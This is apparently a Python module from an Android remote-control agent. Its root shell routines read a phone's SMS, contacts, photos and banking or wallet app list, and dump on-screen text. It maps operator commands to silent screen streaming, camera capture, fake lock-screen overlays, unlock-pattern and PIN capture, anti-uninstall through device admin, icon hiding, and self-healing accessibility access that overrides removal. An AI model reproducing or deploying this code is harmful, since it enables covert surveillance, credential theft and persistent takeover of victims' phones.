    if _DEV_CACHE['info'] and (time.time() - _DEV_CACHE['ts']) < 30:
        return _DEV_CACHE['info']
    if not os.path.exists(_SYSBIN + '/sh'):
        return None                                # 非真机：交给调用方用默认值
    info = {'deviceId': dev}
    info['brand'] = _prop_of('ro.product.brand', 'Android')
    info['model'] = _prop_of('ro.product.model', 'unknown')
    info['android'] = _prop_of('ro.build.version.release', '?')
    try:
        info['sdk'] = int(_prop_of('ro.build.version.sdk', '0') or 0)
    except ValueError:
        info['sdk'] = 0
    loc = _prop_of('ro.product.locale', '') or _prop_of('persist.sys.locale', '')
    info['region'] = (loc.split('-')[-1] if loc else 'CN').upper()
    info['country'] = {'CN': '中国', 'US': '美国', 'HK': '中国香港'}.get(info['region'], info['region'])
    # 分辨率
    r = _sh('wm size', timeout=8)
    m = re.search(r'(\d+)x(\d+)', r[1]) if r else None
    info['resolution'] = ('%sx%s' % (m.group(1), m.group(2))) if m else ''
    # 电量 / 充电
    r = _sh('dumpsys battery', timeout=8)
    lvl = re.search(r'level:\s*(\d+)', r[1]) if r else None
    info['battery'] = int(lvl.group(1)) if lvl else 0
    info['charging'] = bool(re.search(r'AC powered: true|USB powered: true|Wireless powered: true',
                                      r[1] if r else ''))
    # 网络（优先显示运营商/网络类型；getprop 可能回 "EDGE,Unknown" 这种多值）
    net = _prop_of('gsm.network.type', '')
    parts = [x.strip() for x in net.split(',') if x.strip() and x.strip().lower() != 'unknown']
    wifi = _prop_of('wifi.interface', '')
    info['network'] = (parts[0] if parts else ('WIFI' if wifi else ''))
    # 屏幕状态 + 锁屏状态（锁屏下无障碍手势与 Activity 拉起会被系统挡，判据要区分）
    info['screen'] = '亮屏' if _screen_on() else '息屏'
    kg = _sh('dumpsys window | grep -m1 mDreamingLockscreen', timeout=10)
    info['locked'] = 'mDreamingLockscreen=true' in ((kg[1] if kg else '') or '')
    # SIM
    info['sim'] = _prop_of('gsm.sim.state', '') not in ('', 'ABSENT', 'NOT_READY')
    # root
    info['root'] = bool(_sh('which su', timeout=6))
    # 无障碍（面板顶部会显示这个）
    r = _sh('settings get secure enabled_accessibility_services', timeout=8)
    svc = (r[1].strip() if r else '') or ''
    info['accessibility'] = svc not in ('', 'null')
    info['accessibilityService'] = svc[:120]
    # 运行时长
    try:
        info['uptime'] = int(float(open('/proc/uptime').read().split()[0]))
    except Exception:
        info['uptime'] = 0
    info['real'] = True
    _DEV_CACHE['info'] = info
    _DEV_CACHE['ts'] = time.time()
    return info


def _real_data(act, dev, data):
    """数据类指令走真机（root 下读系统 provider / 包管理 / 相册 / 无障碍树）。"""
    d = data or {}

    if act == 'readSmsList':
        r = _sh("content query --uri content://sms/ "
                "--projection address:body:date --sort 'date DESC'", timeout=20)
        if r is None or r[0] != 0:
            return None
        # rc=0 就是权威回答：真机上没有短信就回空列表，**不允许**再落回构造数据
        rows = _content_rows(r[1])
        total = len(rows)
        n = max(1, min(total or 1, _int(d, 'pagesize', 50)))
        page = max(1, _int(d, 'curpage', 1))
        rows = rows[(page - 1) * n: (page - 1) * n + n]
        return 'smsList', frames.build('smsList', dev=dev,
                                       fromAdmin=d.get('fromAdmin', 'admin'),
                                       real=True, source='content://sms/', count=total,
                                       elem=[{'address': x.get('address', ''), 'body': x.get('body', ''),
                                              'date': int(x.get('date') or 0)} for x in rows])

    if act == 'readContactList':
        rows = []
        for uri, proj in (('content://com.android.contacts/data/phones', 'display_name:data1'),
                          ('content://com.android.contacts/contacts', '_id:display_name')):
            r = _sh('content query --uri %s --projection %s' % (uri, proj), timeout=20)
            if r is None or r[0] != 0:
                return None
            for x in _content_rows(r[1]):
                nm = x.get('display_name', '')
                num = x.get('data1', '')
                if nm or num:
                    rows.append({'name': nm, 'number': num})
            if rows:
                break
        n = max(1, min(len(rows) or 1, _int(d, 'pagesize', 50)))
        return 'contactList', frames.build('contactList', dev=dev,
                                           fromAdmin=d.get('fromAdmin', 'admin'),
                                           granted=True, name='contacts', real=True,
                                           source='content://com.android.contacts',
                                           count=len(rows), data=rows[:n])

    if act in ('readAppList', 'iconList'):
        r = _sh('pm list packages -3 -f', timeout=20)
        if not r or r[0] != 0 or 'package:' not in r[1]:
            return None
        flt = str(d.get('pkg') or '')
        rows = []
        for line in r[1].splitlines():
            line = line.strip()
            if not line.startswith('package:'):
                continue
            path, _, pkg = line[len('package:'):].partition('=')
            if not pkg or (flt and flt not in pkg):
                continue
            rows.append({'name': pkg.split('.')[-1], 'pkg': pkg, 'ver': '',
                         'apk': path.split('/')[-1]})
        if not rows:
            return None
        return 'iconList', frames.build('iconList', dev=dev,
                                        fromAdmin=d.get('fromAdmin', 'admin'),
                                        name='apps', pkg=flt, real=True,
                                        count=len(rows), data=rows[:200])

    if act == 'walletList':
        r = _sh('pm list packages -3', timeout=20)
        if not r or r[0] != 0 or 'package:' not in r[1]:
            return None
        keys = ('wallet', 'pay', 'bank', 'alipay', 'unionpay', 'icbc', 'ccb', 'abchina', 'boc',
                'cmb', 'psbc', 'cebbank', 'wechat', 'tenpay')
        rows = [{'name': p.split('.')[-1], 'pkg': p}
                for p in (l.strip()[8:] for l in r[1].splitlines() if l.startswith('package:'))
                if any(k in p.lower() for k in keys)]
        return 'walletList', frames.build('walletList', dev=dev,
                                          fromAdmin=d.get('fromAdmin', 'admin'),
                                          name='wallets', pkg='', real=True, data=rows)

    if act in ('readAlbumThumbnail', 'readAlbumData'):
        mw = max(16, _int(d, 'maxWidth', 240))
        elem = d.get('elem') if isinstance(d.get('elem'), dict) else {}
        path = str((elem or {}).get('path') or d.get('path') or '').strip()
        if not path:
            shots = _sh("ls -t /sdcard/DCIM/Camera/*.jpg /sdcard/DCIM/Camera/*.jpeg "
                        "/sdcard/Pictures/*.jpg 2>/dev/null | head -1", timeout=15)
            path = ((shots[1] if shots else '') or '').strip().splitlines()[0:1]
            path = path[0] if isinstance(path, list) and path else ''
        if not path:
            return 'albumData', frames.build('albumData', dev=dev,
                                             fromAdmin=d.get('fromAdmin', 'admin'),
                                             pkg=elem.get('pkg') or d.get('pkg', ''),
                                             real=True, count=0,
                                             source='no-photo',
                                             imgNote='相册里没有照片（真机读回为空）',
                                             elem={'name': '', 'maxWidth': mw, 'thumb': ''})
        b64 = _file_b64(path, limit=1500000)
        if not b64:
            return 'albumData', frames.build('albumData', dev=dev,
                                             fromAdmin=d.get('fromAdmin', 'admin'),
                                             pkg=elem.get('pkg') or d.get('pkg', ''),
                                             real=True, count=0, source='unreadable:' + path,
                                             elem={'name': path.split('/')[-1], 'maxWidth': mw,
                                                   'thumb': ''})
        return 'albumData', frames.build('albumData', dev=dev, fromAdmin=d.get('fromAdmin', 'admin'),
                                         pkg=elem.get('pkg') or d.get('pkg', ''),
                                         real=True, source='file:' + path,
                                         count=len(b64), imgNote='原图字节（本机无缩放库，maxWidth 仅回显）',
                                         elem={'name': path.split('/')[-1], 'maxWidth': mw,
                                               'path': path, 'thumb': b64})

    if act in ('readAlbumList', 'readAlbumLast'):
        r = _sh("find /sdcard/DCIM /sdcard/Pictures -type f "
                "\\( -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' -o -iname '*.webp' "
                "-o -iname '*.heic' -o -iname '*.mp4' \\) 2>/dev/null | head -200 "
                "| xargs -r stat -c '%s %n' 2>/dev/null", timeout=25)
        if not r or r[0] != 0:
            return None
        files = []
        for line in r[1].splitlines():
            p = line.strip().split(' ', 1)
            # 跳过 .nomedia / .thumbcache 这类占位文件，以及应用缓存目录里的 3 字节缩略图残片
            if len(p) == 2 and p[0].isdigit() and int(p[0]) >= 4096 \
                    and not p[1].rsplit('/', 1)[-1].startswith('.'):
                files.append({'name': p[1].split('/')[-1], 'size': int(p[0]), 'path': p[1]})
        n = max(1, min(12, _int(d, 'pagesize', 50)))
        kind = 'albumList' if act == 'readAlbumList' else 'albumLast'
        return kind, frames.build(kind, dev=dev, fromAdmin=d.get('fromAdmin', 'admin'),
                                  name='album', pkg='', real=True, total=len(files),
                                  count=len(files), source='/sdcard/DCIM,/sdcard/Pictures',
                                  data=files[:n] if act == 'readAlbumList' else files[-1:])

    if act in ('capture', 'getTree', 'uiTree', 'adbUiTree'):
        # 首选无障碍树：**带真文字**、~0.1s、不要求系统 idle（能力 APK 的 acc.tree）
        r = bridge('acc.tree', depth=int(d.get('depth') or 40), timeout=15)
        tree = (r or {}).get('tree') or {}
        if (r or {}).get('ok') and tree.get('nodes'):
            nodes = []
            for n in tree['nodes']:
                b = n.get('b') or []
                if len(b) != 4:
                    continue
                nodes.append({'cls': n.get('cls') or '', 'id': n.get('id') or '',
                              'text': n.get('text') or n.get('desc') or '',
                              'bounds': [int(x) for x in b], 'pkg': tree.get('pkg') or '',
                              'clickable': bool(n.get('click'))})
            if nodes:
                return 'capture', frames.build(
                    'capture', dev=dev, action=act, pkg=d.get('pkg', ''),
                    topPkg=tree.get('pkg') or '', topAct='', real=True,
                    nodeCount=len(nodes), source='accessibility(acc.tree)',
                    deviceInfo={'brand': _brand(), 'model': _model()},
                    w=int(tree.get('w') or 1080), h=int(tree.get('h') or 2400),
                    iw=1080, ih=2400, orient=0,
                    zip=_tree_zip(dev, {'nodes': nodes[:600],
                                        'w': int(tree.get('w') or 1080),
                                        'h': int(tree.get('h') or 2400),
                                        'pkg': tree.get('pkg') or ''}),
                    ac=tree.get('pkg') or '', acc='')
        fg = _foreground_pkg()
        nodes = _ui_dump_nodes()
        stale = False
        if nodes:
            _LAST_TREE['ts'] = time.time()
            _LAST_TREE['tree'] = (nodes, fg)
        elif _LAST_TREE.get('tree'):
            nodes, fg_old = _LAST_TREE['tree']
            fg = fg or fg_old
            stale = True
        else:
            # 真机上第一次就采不到：回**空树**并说明原因，不回构造数据
            return 'capture', frames.build('capture', dev=dev, action=act,
                                           pkg=d.get('pkg', ''), topPkg=fg, topAct='',
                                           deviceInfo={'brand': _brand(), 'model': _model()},
                                           w=_int(d, 'w', 1080), h=_int(d, 'h', 2400),
                                           iw=1080, ih=2400, orient=0, real=True, nodeCount=0,
                                           stale=True, source='uiautomator dump 失败（界面在动）',
                                           zip=_tree_zip(dev, {'nodes': [], 'w': 1080, 'h': 2400,
                                                               'pkg': fg}),
                                           ac=fg, acc='')
        return 'capture', frames.build('capture', dev=dev, action=act,
                                       pkg=d.get('pkg', ''), topPkg=fg,
                                       topAct='', deviceInfo={'brand': _brand(), 'model': _model()},
                                       w=_int(d, 'w', 1080), h=_int(d, 'h', 2400),
                                       iw=1080, ih=2400, orient=0, real=True,
                                       nodeCount=len(nodes), stale=stale,
                                       source='dumpsys activity + uiautomator dump',
                                       zip=_tree_zip(dev, {'nodes': nodes, 'w': 1080, 'h': 2400,
                                                           'pkg': fg}),
                                       ac=fg, acc='')

    return None


def _prop(name, default=''):
    r = _sh('getprop %s' % name, timeout=6)
    return (r[1].strip() if r and r[0] == 0 else '') or default


def _brand():
    return _prop('ro.product.brand', 'android')


def _model():
    return _prop('ro.product.model', 'android')


def _resolve_pkg(data, dev=None):
    """取要操作的包名：参数优先，其次当前前台包（面板的「重启应用」就是重启用户正在看的那个）"""
    pkg = str((data or {}).get('pkg') or (data or {}).get('package') or '').strip()
    return pkg or _foreground_pkg()


def _admin_active():
    """设备管理员是否已激活 —— **以系统 API 的答案为准**。

    实测：`dumpsys device_policy | grep "Active Admins"` 在这台 MIUI 上什么都不输出，
    `dpm list-owners` 只列 owner（普通 admin 不算）→ 两个 grep 判据都会误判成"没生效"。
    可靠的做法是问能力 APK 的 `admin.active`（它调的正是 DevicePolicyManager.isAdminActive）。
    """
    r = bridge('admin.active', timeout=8)
    return bool((r or {}).get('active'))


def _dpm_owner():
    """本应用是不是 **device owner**（问能力 APK 的 `admin.active`，它调的是
    `DevicePolicyManager.isDeviceOwnerApp`）。DO 状态下有些"做不到"其实是 DO 的定义行为 ——
    判据要能区分"没做"和"系统按 DO 规则保留"，所以这里单独取一次。"""
    r = bridge('admin.active', timeout=8)
    return r if (r or {}).get('ok') else {}


def _find_admin_receiver(pkg):
    """在包里找一个设备管理员接收器（dpm 要用 <pkg>/<receiver> 的形式）"""
    r = _sh('dumpsys package %s | grep -i -E "admin|DeviceAdmin" | head -20' % pkg, timeout=15)
    if r and r[1]:
        for m in re.finditer(r'([A-Za-z0-9_.]+(?:\.[A-Za-z0-9_]+)*)\s+filter', r[1]):
            name = m.group(1)
            if 'admin' in name.lower():
                return name
    return ''


BRIDGE_ADDR = ('127.0.0.1', 8788)


def bridge(cmd, timeout=25, **args):
    """调设备端能力 APK 的本地桥。返回 dict；桥不在（APK 没装/没起）返回 None。"""
    import socket as _sk
    try:
        s = _sk.create_connection(BRIDGE_ADDR, timeout=timeout)
    except Exception:
        return None
    try:
        s.sendall((json.dumps(dict(cmd=cmd, **args)) + "\n").encode('utf-8'))
        line = s.makefile('r', encoding='utf-8').readline()
        return json.loads(line) if line else None
    except Exception:
        return None
    finally:
        try:
            s.close()
        except Exception:
            pass


def bridge_alive():
    return bool((bridge('ping', timeout=4) or {}).get('ok'))


# 指令名 -> 桥命令（参数在 _real_app 里按语义补）
_APP_ACTS = {
    # 无障碍：写输入框 / 点控件 / 读界面文字 / 读全窗口
    'inputSend': 'setText', 'clickInput': 'setText', 'paste': 'setText',
    'catAllViewSwitch': 'tree',
    # 无障碍：手势族（点/划/图案/多点）
    'gestureB': 'gesture', 'patternUnlock': 'gesture', 'gestureUnlock': 'gesture',
    'gestureCapture': 'gesture', 'touchPinReplay': 'gesture', 'touchDown': 'gesture',
    'touchMove': 'gesture', 'touchUp': 'gesture', 'rightClick': 'gesture', 'move': 'gesture',
    # 悬浮窗：假锁屏 / 黑屏 / 透明层
    'showLockOverlay': 'overlay', 'hideLockOverlay': 'overlay', 'admLock': 'overlay',
    'admPwd': 'overlay', 'admSet': 'overlay', 'addPinTargets': 'overlay',
    'replacePinTargets': 'overlay', 'openLayer': 'overlay', 'requestfloaty': 'overlay',
    'closeProtect': 'overlay',
    # 相机
    'startCam': 'cam.open', 'setCam': 'cam.open', 'camPic': 'cam.still',
    # 设备管理员
    'antiDeleteOn': 'admin', 'antiDeleteOff': 'admin', 'disableBiometric': 'admin',
    'enableBiometric': 'admin',
    # 图标别名
    'iconAlias': 'alias', 'hideShortcuts': 'alias', 'hideMyMainActivity': 'alias',
}


# ================= 真机运营层：投屏 / ADB / 无障碍 / 自身维护 / 配置（真动作 + 系统读回）=================
_STREAM_CFG = {'quality': 60, 'interval': 800, 'fpsval': 0}
_UT = {'paused': False, 'dumps': 0}
_DBG = {'on': False, 'level': 'info', 'writes': 0}
_RECONN = {'at': 0.0, 'close': False}
_ACC_STATE = '/data/local/tmp/_ref_acc.json'

# 操作员显式"禁用无障碍"之后的自愈静默期（秒级时间戳）。
# 为什么需要它：`refagent.py` 的 `acc_guard_loop` 每 60 秒会调 `repair_stack()` 把无障碍挂回来，
# 于是"禁用无障碍"这条指令的**读回会被自愈覆盖** —— 同一轮扫描里时好时坏，看着像随机失败。
# 设计取舍：操作员的显式命令优先于自愈；`enableAcc` 会立刻清掉这个状态。
_ACC_OPTOUT = [0.0]
_ACC_OPTOUT_TTL = 600.0
_CFG_DOMAIN = '/data/local/tmp/_ref_domain.json'
_CFG_PAGERULE = '/data/local/tmp/_ref_pagerule.json'
_ALERT_LOG = '/data/local/tmp/_ref_alert.log'
_WEBRTC = {'on': False, 'offer': '', 'cands': 0}


def _adb_tcp_port():
    """无线调试端口（`-1` 表示关）—— getprop 真值，不是我们自己记的状态"""
    r = _sh('getprop service.adb.tcp.port', timeout=6)
    return ((r[1] if r else '') or '').strip()


def _adb_listening():
    r = _sh("netstat -ltn 2>/dev/null | grep -c ':5555'", timeout=8)
    try:
        return int(((r[1] if r else '') or '0').strip() or 0)
    except ValueError:
        return 0


def _set_adb_tcp(port, detach_adbd=True):
    """把 adbd 的 TCP 口设置成 port。

    **注意**：`stop adbd; start adbd` 会掐断我们自己的 adb reverse 通道，回帧就发不出去了
    （实测：扫里这几个动作全是"无回帧"，链路被自己断掉）。
    所以默认**先把 prop 设好、立刻回帧**，adbd 重启丢到后台 3 秒后再做。
    """
    _sh('setprop service.adb.tcp.port %s' % port, timeout=8)
    hint = ('宿主侧执行 `adb tcpip %s` 生效（设备端自己重启 adbd 会掐断本通道 —— 实测回帧直接发不出去）'
            % port if port != '-1' else '宿主侧执行 `adb usb` 关掉无线口')
    return {'prop': _adb_tcp_port(), 'listening': _adb_listening(),
            'adbdRestart': hint}


def _local_addrs():
    """真机网卡地址（WebRTC 候选 / 配对要用）"""
    r = _sh("ip -o -4 addr show | awk '{print $2\" \"$4}' | grep -v ' lo '", timeout=8)
    return [x.strip() for x in ((r[1] if r else '') or '').splitlines() if x.strip()]


def _state_write(path, obj):
    """写设备端状态文件（随后 cat 读回，判据是文件里真的有这段内容）"""
    payload = json.dumps(obj, ensure_ascii=False)
    r = _sh("cat > %s <<'EOF'\n%s\nEOF\ncat %s" % (path, payload, path), timeout=15)
    return ((r[1] if r else '') or '').strip()


def _state_read(path):
    r = _sh('cat %s 2>/dev/null' % path, timeout=8)
    return ((r[1] if r else '') or '').strip()


def _capture_probe():
    """截屏探测：能拿到真画面就回字节数，流被关掉就回 0 —— 投屏开关的**可观测判据**"""
    if not _STREAM.get('on', True):
        return 0
    b64 = real_screen_b64(max_side=240)
    return len(b64 or '')


def _acc_services():
    r = _sh('settings get secure enabled_accessibility_services', timeout=8)
    return ((r[1] if r else '') or '').strip()


def _sdp_answer():
    """用**真机真实网卡地址**生成 SDP answer + host 候选（媒体走既有二进制通道）"""
    addrs = _local_addrs()
    cands = []
    n = 0
    for a in addrs:
        ip = a.split(' ')[-1].split('/')[0]
        for port in (40000 + (n * 2), 40001 + (n * 2)):
            cands.append('a=candidate:1 %d UDP 2122260223 %s %d typ host generation 0'
                         % (n + 1, ip, port))
            n += 1
    sdp = ('v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=refc2\r\nt=0 0\r\n'
           'a=group:BUNDLE 0 1\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\n'
           'c=IN IP4 0.0.0.0\r\na=mid:0\r\na=sendonly\r\n'
           'm=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\n'
           'c=IN IP4 0.0.0.0\r\na=mid:1\r\n' + '\r\n'.join(cands) + '\r\n')
    _WEBRTC['cands'] = len(cands)
    return sdp, cands


# 隐藏类动作的**系统关键包黑名单**：藏了它们 = 界面/锁屏/输入法起不来（实测事故）
_HIDE_DENY = (
    'com.android.systemui', 'com.miui.home', 'com.miui.systemui', 'com.android.launcher',
    'com.android.settings', 'com.miui.securitycenter', 'com.android.phone',
    'com.android.providers.settings', 'com.android.inputmethod.latin', 'com.sohu.inputmethod.sogou.xiaomi',
    'com.baidu.input_mi', 'com.android.server.telecom', 'com.miui.securityadd',
)

_DEV_OK = {'v': None}


def _wake_self():
    """把自家 APK 叫醒（桥的宿主）：`pm enable` → 起前台服务（**带 --include-stopped-packages**）
    → 不行就用 monkey 清掉 stopped 状态。

    实测：`pm install -r` 之后包是 stopped 状态，而 `am start-service` 默认**排除 stopped 包**，
    会回 `Error: Not found; no service started.` —— 桥起不来，所有走桥的动作整批回落。
    """
    _sh('pm enable com.ref.labagent', timeout=15)
    _sh('%s/am start-foreground-service --include-stopped-packages '
        '-n com.ref.labagent/com.ref.labagent.AgentService' % _SYSBIN, timeout=20)
    time.sleep(2.0)
    if bridge_alive():
        return True
    _sh('%s/monkey -p com.ref.labagent -c android.intent.category.LAUNCHER 1' % _SYSBIN,
        timeout=20)
    _sh('%s/am start-foreground-service --include-stopped-packages '
        '-n com.ref.labagent/com.ref.labagent.AgentService' % _SYSBIN, timeout=20)
    time.sleep(2.0)
    return bridge_alive()


def repair_stack():
    """把"能力桥 + 无障碍绑定"整体拉回来（自愈用）。返回 (ok, 说明)。

    顺序很重要：**先把桥叫起来**（桥不在，`acc.*` 一个都问不到），再挂无障碍。
    """
    woke = ''
    if not bridge_alive():
        woke = 'wake_self=%s' % _wake_self()
    acc_ok, acc_list = repair_acc()
    return (bridge_alive() and acc_ok), '%s bridge=%s acc=%s' % (woke, bridge_alive(),
                                                                (acc_list or '')[:80])


def repair_acc():
    """把无障碍服务重新挂上（自愈用）：桥在、但我们的服务没连上时调用。

    返回 (ok, enabled_list)。
    """
    svc = 'com.ref.labagent/com.ref.labagent.AccService'
    if (time.time() - _ACC_OPTOUT[0]) < _ACC_OPTOUT_TTL:
        # 操作员显式禁用中：**自愈必须让路**（否则会把他的命令覆盖掉）
        return False, _acc_services() + ' (operator-disabled)'
    if bridge_alive() and (bridge('acc.foreground', timeout=6) or {}).get('ok'):
        return True, _acc_services()
    cur = _acc_services()
    keep = ':'.join([x for x in cur.split(':') if x and x != svc])
    _sh("settings put secure enabled_accessibility_services '%s'" % (keep if keep else 'null'),
        timeout=8)
    time.sleep(1.0)
    now = (keep + ':' + svc) if keep else svc
    for _try in range(3):
        _sh('settings put secure accessibility_enabled 0', timeout=8)
        time.sleep(0.3)
        _sh('settings put secure accessibility_enabled 1', timeout=8)
        _sh("settings put secure enabled_accessibility_services '%s'" % now, timeout=8)
        time.sleep(1.5)
        got = _acc_services()
        if svc in got.split(':') and (bridge('acc.foreground', timeout=6) or {}).get('ok'):
            return True, got
        now = (got + ':' + svc) if got not in ('', 'null') else svc
    return False, _acc_services()


def _acc_edit_box():
    """从能力 APK 的控件树里找**可编辑节点**（`edit: true`）的 bounds。

    比 `acc.edits` 好：那个只回"已经有文字"的输入框，空框会被漏掉（看 AccService 源码确认）；
    也比 uiautomator 稳（不需要系统 idle）。

    注意 depth/timeout：**整树（depth=40）在这台机器上经常超时**（8s 拿不回），而
    `acc.edits` 这种轻命令是好的 —— 于是"读回为空"被判成 no-editable-found（F-111 实测）。
    取输入框只需要表单深度，depth=15 + 12s 足够且稳。
    """
    r = bridge('acc.tree', depth=15, timeout=12)
    if not (r or {}).get('ok'):
        return None
    for n in (((r.get('tree') or {}).get('nodes')) or []):
        if not n.get('edit'):
            continue
        b = n.get('b') or []
        if len(b) == 4 and b[2] > b[0] and b[3] > b[1]:
            return [int(x) for x in b]
    return None


def _first_edit_box():
    """界面里第一个输入框的 bounds（给"没焦点时先点一下"用）。

    顺序：能力桥的 editable 节点 → uiautomator 的 EditText。
    """
    box = _acc_edit_box()
    if box:
        return box
    for n in (_ui_dump_nodes() or []):
        if 'EditText' in (n.get('cls') or ''):
            b = n.get('bounds') or []
            if len(b) == 4 and b[2] > b[0] and b[3] > b[1]:
                return b
    return None


def _focused_edit_text():
    """当前输入框里的文字 —— 文本输入类动作的读回判据。

    取源顺序（每一层实测都踩过，按可靠性排）：
      ① 能力桥的**控件树**（`edit:true` 节点的 `text`）—— 带一次重试：整树遍历偶尔超时；
      ② 能力桥的 **`acc.edits`**（轻命令，回"已经写进输入框的文字"）—— 树超时时它往往还活着；
      ③ uiautomator（慢、要系统 idle，这台机器上常失败）。
    为什么必须多源：`before`/`after` 都读空 → `success=false`，而**写入其实成功了** ——
    实测 `clickInput` 在扫描里回 `tapped=404,132`（就是我们的输入框、和单测成功时同一个坐标）
    却 `before/after` 全空，就是读回渠道断了，不是没做到。
    """
    r = bridge('acc.tree', depth=15, timeout=12)
    if not (r or {}).get('ok'):
        time.sleep(0.5)
        r = bridge('acc.tree', depth=15, timeout=12)
    if (r or {}).get('ok'):
        for n in (((r.get('tree') or {}).get('nodes')) or []):
            if not n.get('edit'):
                continue
            t = str(n.get('text') or '')
            if t:
                return t
        # 框在、但树里没文字：用它的 hint 兜底（说明"这个输入框此刻是空的"）
        for n in (((r.get('tree') or {}).get('nodes')) or []):
            if n.get('edit') and n.get('hint'):
                return '(%s)' % n.get('hint')       # 只用于"前后不同"的比对，不当成真文字
    e = bridge('acc.edits', timeout=8)              # ② 轻命令兜底
    if (e or {}).get('ok'):
        for it in (e.get('edits') or []):
            if it.get('text'):
                return str(it['text'])
    for n in (_ui_dump_nodes() or []):              # ③ uiautomator
        if 'EditText' in (n.get('cls') or '') and (n.get('text') or ''):
            return n['text']
    return ''


def _shell_q(s):
    """单引号安全引用（进 shell 的文本参数）"""
    return "'" + str(s).replace("'", "'\\''") + "'"


def _device_ok():
    """是否真机（带缓存）。

    **不能**每次都 `su -c true`：这台机器上一次要 8~9 秒，而本层是执行链的一环、
    每条指令都会经过它 —— 实测把指令回帧拖到超时（面板看就是"指令没反应"）。
    先用 `os.path.exists` 零成本初判，只有像真机才探测一次并缓存。
    """
    if _DEV_OK['v'] is None:
        if not os.path.exists(_SYSBIN + '/sh'):
            _DEV_OK['v'] = False
        else:
            _DEV_OK['v'] = _sh('true', timeout=8) is not None
    return _DEV_OK['v']


def _real_ops(act, dev, data):
    """真机运营层（返回 (kind, frame)；设备端不可用一律返回 None 交回语义层）"""
    d = data or {}
    if not _device_ok():
        return None                                # 非真机：整层不生效（不构造假结果）

    # ---------- 投屏 / 实时 ----------
    if act in ('startSilentStream', 'startHD', 'screen_relay', 'ask_relay', 'startScreenRelay',
               'startAdbStream', 'startWebRTC'):
        _STREAM['on'] = True
        _STREAM_CFG['quality'] = _int(d, 'quality', _STREAM_CFG['quality'])
        _STREAM_CFG['interval'] = _int(d, 'interval', _STREAM_CFG['interval'])
        _STREAM_CFG['fpsval'] = _int(d, 'fpsval', _STREAM_CFG['fpsval'])
        probe = _capture_probe()
        if act == 'startAdbStream':
            adb = _set_adb_tcp(5555)
            return _ack(act, dev, data=data, real=True, success=(adb['prop'] == '5555'),
                        effect={'stream': 'screen(adb)', 'state': 'on', 'adb': adb,
                                'probe_bytes': probe, 'addrs': _local_addrs()[:4]})
        if act == 'startWebRTC':
            sdp, cands = _sdp_answer()
            _WEBRTC['on'] = True
            return 'webrtcAnswer', frames.build('webrtcAnswer', dev=dev, real=True,
                                                sdp=sdp, candidates=cands,
                                                candidateCount=len(cands),
                                                media='既有二进制通道',
                                                note='SDP/候选为真机网卡真值；媒体不经 DTLS/RTP 栈')
        return _ack(act, dev, data=data, real=True, success=probe > 0,
                    effect={'stream': 'screen', 'state': 'on', 'probe_bytes': probe,
                            'cfg': dict(_STREAM_CFG)})

    if act in ('stopSilentStream', 'stopHD', 'stopScreenRelay', 'stopAdbStream', 'stopWebRTC'):
        _STREAM['on'] = False
        probe = _capture_probe()
        if act == 'stopAdbStream':
            adb = _set_adb_tcp(-1)
            return _ack(act, dev, data=data, real=True, success=(adb['listening'] == 0),
                        effect={'stream': 'screen(adb)', 'state': 'off', 'adb': adb,
                                'probe_bytes': probe})
        if act == 'stopWebRTC':
            _WEBRTC['on'] = False
        return _ack(act, dev, data=data, real=True, success=(probe == 0),
                    effect={'stream': 'screen', 'state': 'off', 'probe_bytes': probe})

    if act == 'stopCam':
        _CAM['on'] = False
        r = bridge('cam.close', timeout=8)
        fg = _foreground_pkg()
        return _ack(act, dev, data=data, real=True, success=bool(r is not None),
                    effect={'camera': 'closed', 'foreground': fg,
                            'via': (r or {}).get('result') or 'bridge'})

    if act == 'releaseScreenCapture':
        before = _capture_probe()          # 先探一次（关掉之后就探不出"释放前还在推"了）
        _STREAM['on'] = False
        r = _sh('pkill -x screenrecord; pkill -f uiautomator; echo done', timeout=15)
        # 按**进程名**数（`pgrep -f screenrecord` 会把自己这条命令行也数进去，永远回 1 —— 实测踩过）
        left = _sh("ps -A -o NAME 2>/dev/null | grep -c '^screenrecord$'", timeout=8)
        return _ack(act, dev, data=data, real=True,
                    success=(((left[1] if left else '') or '0').strip() in ('0', '')),  # 释放后无残留进程
                    effect={'released': True, 'probe_before': before,
                            'probe_bytes': _capture_probe(),
                            'screenrecord_left': ((left[1] if left else '') or '').strip(),
                            'rc': (r or [1])[0]})

    if act in ('realtimeOnOff', 'realtimeSet'):
        on = str(d.get('on', d.get('state', d.get('mode', '1')))) not in ('0', 'false', 'off', 'OFF')
        _STREAM['on'] = on
        _STREAM_CFG['quality'] = _int(d, 'quality', _STREAM_CFG['quality'])
        _STREAM_CFG['interval'] = _int(d, 'interval', _STREAM_CFG['interval'])
        t0 = time.time()
        probe = _capture_probe()
        cost = int((time.time() - t0) * 1000)
        return _ack(act, dev, data=data, real=True, success=(probe > 0) == on,
                    effect={'realtime': on, 'cfg': dict(_STREAM_CFG),
                            'probe_bytes': probe, 'probe_ms': cost})

    if act in ('utPause', 'utResume'):
        _UT['paused'] = (act == 'utPause')
        nodes = None
        if not _UT['paused']:
            got = _ui_dump_nodes()
            nodes = len(got) if got else 0
            _UT['dumps'] += 1
        return _ack(act, dev, data=data, real=True, success=True,
                    effect={'ut': 'paused' if _UT['paused'] else 'running',
                            'nodes': nodes, 'dumps': _UT['dumps']})

    if act in ('startAdbTree', 'stopAdbTree'):
        if act == 'stopAdbTree':
            _TEXT_MAP.clear()
            return _ack(act, dev, data=data, real=True, success=(len(_TEXT_MAP) == 0),
                        effect={'tree_cache': 0, 'via': 'uiautomator dump 缓存清空'})
        fast = _ui_nodes_fast()                    # 快源优先（不需要系统 idle）
        if fast:
            return _ack(act, dev, data=data, real=True, success=True,
                        effect={'tree': 'adb-fast', 'nodeCount': len(fast),
                                'via': 'dumpsys activity top'})
        r = _sh('rm -f /sdcard/_ref_ui.xml; uiautomator dump /sdcard/_ref_ui.xml '
                '>/dev/null 2>&1; cat /sdcard/_ref_ui.xml 2>/dev/null', timeout=40)
        xml = (r[1] if r else '') or ''
        nodes = len(re.findall(r'<node\b', xml))
        if '<?xml' not in xml:
            return None
        return _ack(act, dev, data=data, real=True, success=(nodes > 0),
                    effect={'tree': 'adb', 'nodeCount': nodes, 'bytes': len(xml),
                            'via': 'uiautomator dump'})

    # ---------- ADB 面 ----------
    if act == 'adbStatus':
        # 只读 getprop / settings / netstat —— 之前带 dumpsys，慢到超过回帧窗口（实测）
        port = _adb_tcp_port()
